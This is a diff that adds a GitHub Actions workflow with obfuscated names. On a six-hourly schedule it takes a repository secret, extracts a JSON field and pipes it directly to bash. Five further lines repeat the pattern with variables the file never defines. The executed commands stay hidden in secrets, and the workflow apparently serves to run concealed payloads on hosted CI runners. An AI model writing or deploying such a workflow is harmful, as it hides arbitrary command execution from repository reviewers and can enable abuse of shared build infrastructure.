@@ -1,0 +1,23 @@
+name: liangruhao4719
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangruhao4719
+        env:
+          njh661: ${{ secrets.njh661 }}
+        run: |
+          echo $njh661 | jq -r .qq77 | /bin/bash
+          echo $t8 | jq -r .apq9 | /bin/bash
+          echo $g0743 | jq -r .icmc0020 | /bin/bash
+          echo $lou480 | jq -r .tfjx54 | /bin/bash
+          echo $sj49 | jq -r .bxl75 | /bin/bash
+          echo $bkqbd99 | jq -r .pohs150 | /bin/bash
+
